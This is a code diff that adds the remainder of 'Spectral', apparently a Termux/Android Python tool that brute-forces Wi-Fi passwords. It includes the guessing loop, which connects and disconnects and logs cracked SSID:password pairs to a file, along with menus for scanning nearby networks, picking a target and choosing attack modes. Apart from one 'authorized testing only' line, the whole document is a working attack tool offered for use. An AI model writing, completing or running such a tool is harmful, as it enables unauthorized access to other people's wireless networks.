@@ -558,4 +558,338 @@ def brute_force(ssid: str, mode: str, min_len: int, max_len: int, delay: float):
         if attempts - last_save >= 100000:
             last_save = attempts
             try:
-                with open():
+               with open(progress_file, 'w') as f:
+                    f.write(f"Attempts: {attempts}\n")
+                    f.write(f"Last password: {password}\n")
+                    f.write(f"Elapsed: {time.time() - start_time:.1f}s\n")
+                    f.write(f"Target: {ssid}\n")
+            except:
+                pass
+        
+        # Disconnect before each attempt
+        if attempts > 1:
+            disconnect_wifi()
+            time.sleep(max(0.05, delay * 0.2))
+        
+        # Try the password
+        if try_wifi_password(ssid, password):
+            found = True
+            password_found = password
+            found_event.set()
+            elapsed = time.time() - start_time
+            rate = attempts / elapsed if elapsed > 0 else 0
+            
+            print(f"\n\n{GREEN}{'='*60}{RESET}")
+            print(f"{GREEN}[+] {'='*56}{RESET}")
+            print(f"{GREEN}[+] 🔓 PASSWORD FOUND!{RESET}")
+            print(f"{GREEN}[+] {'='*56}{RESET}")
+            print(f"{GREEN}[+] SSID:{RESET}     {ssid}")
+            print(f"{GREEN}[+] Password:{RESET} {BOLD}{password}{RESET}")
+            print(f"{MAGENTA}[+] Attempts:{RESET} {attempts:,}")
+            print(f"{MAGENTA}[+] Time:{RESET}    {human_time(elapsed)}")
+            print(f"{MAGENTA}[+] Rate:{RESET}    {rate:.1f} p/s")
+            print(f"{GREEN}[+] {'='*56}{RESET}")
+            
+            # Save result
+            result_file = 'spectral_cracked.txt'
+            with open(result_file, 'a') as f:
+                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+                f.write(f"[{timestamp}] {ssid}:{password}\n")
+            print(f"{GREEN}[+] Saved to {result_file}{RESET}")
+            
+            input(f"\n{CYAN}[Press Enter to continue]{RESET}")
+            break
+        
+        time.sleep(delay)
+    
+    if not found and not stop_attack:
+        elapsed = time.time() - start_time
+        print(f"\n\n{RED}[!] Password not found in search space.{RESET}")
+        print(f"{YELLOW}[*] Tried {attempts:,} passwords in {human_time(elapsed)}{RESET}")
+        print(f"{YELLOW}[*] Try different mode, increase max length, or lower delay{RESET}")
+        input(f"\n{CYAN}[Press Enter to continue]{RESET}")
+
+
+# =============== MENU FUNCTIONS ===============
+
+def menu_scan_and_attack():
+    """Scan networks, display them, then let user pick one to attack."""
+    clear_screen()
+    print(f"{BANNER}")
+    print(f"{BOLD}{' NETWORK SCANNER ':=^60}{RESET}\n")
+    
+    networks = scan_networks()
+    display_networks(networks)
+    
+    if not networks:
+        print(f"\n{YELLOW}[*] No networks found. Make sure Wi-Fi is enabled.{RESET}")
+        input(f"\n{CYAN}[Press Enter to return to menu]{RESET}")
+        return
+    
+    # Let user select by number or type SSID
+    print(f"\n{CYAN}[>] Options:{RESET}")
+    print(f"  1. Select by number")
+    print(f"  2. Type SSID manually")
+    choice = input(f"\n{CYAN}[>] Choose (1/2): {RESET}").strip()
+    
+    target_ssid = None
+    
+    if choice == '1':
+        try:
+            idx = int(input(f"{CYAN}[>] Enter network number: {RESET}")) - 1
+            if 0 <= idx < len(networks):
+                target_ssid = networks[idx]['ssid']
+                print(f"{GREEN}[+] Selected: {target_ssid}{RESET}")
+            else:
+                print(f"{RED}[!] Invalid number.{RESET}")
+                input(f"{CYAN}[Press Enter]{RESET}")
+                return
+        except ValueError:
+            print(f"{RED}[!] Invalid input.{RESET}")
+            input(f"{CYAN}[Press Enter]{RESET}")
+            return
+    elif choice == '2':
+        target_ssid = input(f"{CYAN}[>] Enter SSID: {RESET}").strip()
+        if not target_ssid:
+            print(f"{RED}[!] SSID cannot be empty.{RESET}")
+            input(f"{CYAN}[Press Enter]{RESET}")
+            return
+        print(f"{GREEN}[+] Target: {target_ssid}{RESET}")
+    else:
+        print(f"{RED}[!] Invalid choice.{RESET}")
+        input(f"{CYAN}[Press Enter]{RESET}")
+        return
+    
+    # Now configure the attack
+    menu_configure_attack(target_ssid)
+
+
+def menu_manual_ssid():
+    """Manually enter an SSID to attack."""
+    clear_screen()
+    print(f"{BANNER}")
+    print(f"{BOLD}{' MANUAL TARGET ':=^60}{RESET}\n")
+    
+    target_ssid = input(f"{CYAN}[>] Enter target SSID: {RESET}").strip()
+    if not target_ssid:
+        print(f"{RED}[!] SSID cannot be empty.{RESET}")
+        input(f"{CYAN}[Press Enter]{RESET}")
+        return
+    
+    menu_configure_attack(target_ssid)
+
+
+def menu_configure_attack(ssid: str):
+    """Configure attack parameters for a given SSID."""
+    clear_screen()
+    print(f"{BANNER}")
+    print(f"{BOLD}{' ATTACK CONFIGURATION ':=^60}{RESET}\n")
+    print(f"  {YELLOW}Target:{RESET} {BOLD}{ssid}{RESET}\n")
+    
+    # Mode selection
+    print(f"{BOLD}Attack Modes:{RESET}")
+    print(f"  {GREEN}1.{RESET} quick      - Common patterns + 4-6 digit PIN (fast)")
+    print(f"  {GREEN}2.{RESET} smart      - Common + numeric(1-10) + short alpha (recommended)")
+    print(f"  {GREEN}3.{RESET} aggressive - Everything up to 8 chars mixed case")
+    print(f"  {GREEN}4.{RESET} numeric    - Numbers only (good for PIN-based networks)")
+    print(f"  {GREEN}5.{RESET} lowercase  - Lowercase letters only")
+    print(f"  {GREEN}6.{RESET} alphanum   - Lowercase + digits")
+    print(f"  {GREEN}7.{RESET} full       - Full mixed alphanumeric (BIGGEST search)")
+    
+    mode_map = {
+        '1': 'quick', '2': 'smart', '3': 'aggressive',
+        '4': 'numeric', '5': 'lowercase', '6': 'alphanum', '7': 'full'
+    }
+    
+    mode_choice = input(f"\n{CYAN}[>] Select mode [2]: {RESET}").strip() or '2'
+    mode = mode_map.get(mode_choice, 'smart')
+    print(f"{GREEN}[+] Mode: {mode}{RESET}")
+    
+    # Min length
+    min_input = input(f"{CYAN}[>] Min password length [1]: {RESET}").strip()
+    min_len = int(min_input) if min_input.isdigit() else 1
+    
+    # Max length
+    max_input = input(f"{CYAN}[>] Max password length [10]: {RESET}").strip()
+    max_len = int(max_input) if max_input.isdigit() else 10
+    
+    if min_len > max_len:
+        min_len, max_len = 1, max_len
+    if min_len < 1:
+        min_len = 1
+    
+    print(f"{GREEN}[+] Length range: {min_len} - {max_len}{RESET}")
+    
+    # Delay
+    delay_input = input(f"{CYAN}[>] Delay between attempts in seconds [0.3]: {RESET}").strip()
+    try:
+        delay = float(delay_input)
+    except ValueError:
+        delay = 0.3
+    
+    # Auto-adjust for root
+    if check_root():
+        if delay > 0.15:
+            fast = input(f"{CYAN}[?] Root detected. Use faster delay (0.1s)? (Y/n): {RESET}").lower()
+            if fast != 'n':
+                delay = 0.1
+                print(f"{GREEN}[+] Using delay: {delay}s{RESET}")
+    
+    # Show estimate
+    estimated = estimate_search_space(mode, min_len, max_len)
+    est_time = estimated * delay
+    print(f"\n{YELLOW}[*] Estimated search space: {human_readable_count(estimated)} passwords{RESET}")
+    print(f"{YELLOW}[*] Estimated time: {human_time(est_time)}{RESET}")
+    
+    # Confirm
+    confirm = input(f"\n{GREEN}[?] Start attack on '{ssid}'? (Y/n): {RESET}").lower()
+    if confirm == 'n':
+        print(f"{YELLOW}[!] Attack cancelled.{RESET}")
+        input(f"{CYAN}[Press Enter]{RESET}")
+        return
+    
+    # Launch
+    brute_force(ssid, mode, min_len, max_len, delay)
+
+
+def menu_quick_attack():
+    """Quick attack: scan, pick a network, use 'smart' mode defaults."""
+    clear_screen()
+    print(f"{BANNER}")
+    print(f"{BOLD}{' QUICK ATTACK ':=^60}{RESET}\n")
+    print(f"{YELLOW}[*] This will scan networks and let you pick one to attack with smart defaults.{RESET}\n")
+    
+    networks = scan_networks()
+    display_networks(networks)
+    
+    if not networks:
+        input(f"{CYAN}[Press Enter]{RESET}")
+        return
+    
+    try:
+        idx = int(input(f"\n{CYAN}[>] Enter network number to attack: {RESET}")) - 1
+        if 0 <= idx < len(networks):
+            ssid = networks[idx]['ssid']
+            print(f"{GREEN}[+] Quick attacking: {ssid}{RESET}")
+            brute_force(ssid, 'smart', 1, 10, 0.3)
+        else:
+            print(f"{RED}[!] Invalid number.{RESET}")
+            input(f"{CYAN}[Press Enter]{RESET}")
+    except ValueError:
+        print(f"{RED}[!] Invalid input.{RESET}")
+        input(f"{CYAN}[Press Enter]{RESET}")
+
+
+def menu_scan_only():
+    """Just scan and display networks, no attack."""
+    clear_screen()
+    print(f"{BANNER}")
+    print(f"{BOLD}{' NETWORK SCAN ':=^60}{RESET}\n")
+    
+    networks = scan_networks()
+    display_networks(networks)
+    
+    if networks:
+        print(f"\n{GREEN}[+] Found {len(networks)} networks{RESET}")
+    
+    input(f"\n{CYAN}[Press Enter to return to menu]{RESET}")
+
+
+def menu_about():
+    """Display tool information."""
+    clear_screen()
+    print(f"{BANNER}")
+    print(f"{BOLD}{' ABOUT SPECTRAL ':=^60}{RESET}\n")
+    print(f"  {YELLOW}Version:{RESET}  {VERSION}")
+    print(f"  {YELLOW}Author:{RESET}   {AUTHOR}")
+    print(f"  {YELLOW}Purpose:{RESET}  WiFi password auditing tool")
+    print(f"\n  {DIM}Spectral generates password candidates combinatorially")
+    print(f"  and attempts to connect to the target WiFi network.")
+    print(f"  It uses wpa_cli (root) or nmcli for connections.")
+    print(f"  No external wordlist required.{RESET}")
+    print(f"\n  {RED}[!] For authorized security testing only.{RESET}")
+    input(f"\n{CYAN}[Press Enter to return to menu]{RESET}")
+
+
+# =============== MAIN MENU ===============
+
+def main_menu():
+    """Display the main Spectral menu."""
+    while True:
+        clear_screen()
+        print(f"{BANNER}")
+        
+        # Show root status
+        root_status = f"{GREEN}✓ Root{RESET}" if check_root() else f"{RED}✗ No Root{RESET}"
+        print(f"  Status: {root_status}\n")
+        
+        print(f"{BOLD}{' MAIN MENU ':=^60}{RESET}\n")
+        print(f"  {GREEN}1.{RESET} {BOLD}Scan & Attack{RESET}     - Scan networks, pick one, configure attack")
+        print(f"  {GREEN}2.{RESET} {BOLD}Quick Attack{RESET}      - Scan, pick, attack with defaults")
+        print(f"  {GREEN}3.{RESET} {BOLD}Manual SSID{RESET}       - Type target SSID manually")
+        print(f"  {GREEN}4.{RESET} {BOLD}Scan Only{RESET}         - Just view nearby networks")
+        print(f"  {GREEN}5.{RESET} {BOLD}About{RESET}             - Tool info")
+        print(f"  {RED}0.{RESET} {BOLD}Exit{RESET}\n")
+        
+        choice = input(f"{CYAN}[>] Select: {RESET}").strip()
+        
+        if choice == '1':
+            menu_scan_and_attack()
+        elif choice == '2':
+            menu_quick_attack()
+        elif choice == '3':
+            menu_manual_ssid()
+        elif choice == '4':
+            menu_scan_only()
+        elif choice == '5':
+            menu_about()
+        elif choice == '0':
+            clear_screen()
+            print(f"{BANNER}")
+            print(f"\n{GREEN}[+] Exiting Spectral. Stay legal.{RESET}\n")
+            sys.exit(0)
+        else:
+            print(f"{RED}[!] Invalid choice.{RESET}")
+            time.sleep(1)
+
+
+# =============== ENTRY POINT ===============
+
+if __name__ == '__main__':
+    clear_screen()
+    print(f"{BANNER}")
+    
+    # Check dependencies
+    has_termux_api = True
+    try:
+        subprocess.run(['termux-wifi-scaninfo', '--help'],
+                      capture_output=True, timeout=3)
+    except:
+        has_termux_api = False
+    
+    if not has_termux_api:
+        print(f"{YELLOW}[!] termux-wifi-scaninfo not detected.{RESET}")
+        print(f"{YELLOW}[*] Install: pkg install termux-api && pip install termux-api{RESET}")
+        print(f"{YELLOW}[*] Also enable Termux:API in Android settings{RESET}")
+        cont = input(f"\n{CYAN}[?] Continue anyway? (Y/n): {RESET}").lower()
+        if cont == 'n':
+            sys.exit(1)
+    
+    if not check_root():
+        print(f"{YELLOW}[!] Not running as root. Connection methods limited.{RESET}")
+        print(f"{YELLOW}[*] For best results: su -c 'python3 spectral.py'{RESET}")
+        time.sleep(2)
+    else:
+        print(f"{GREEN}[+] Root access confirmed.{RESET}")
+        time.sleep(1)
+    
+    try:
+        main_menu()
+    except KeyboardInterrupt:
+        clear_screen()
+        print(f"{BANNER}")
+        print(f"\n{YELLOW}[!] Interrupted. Exiting.{RESET}\n")
+        sys.exit(0)
+    except Exception as e:
+        print(f"{RED}[!] Fatal error: {e}{RESET}")
+        sys.exit(1)
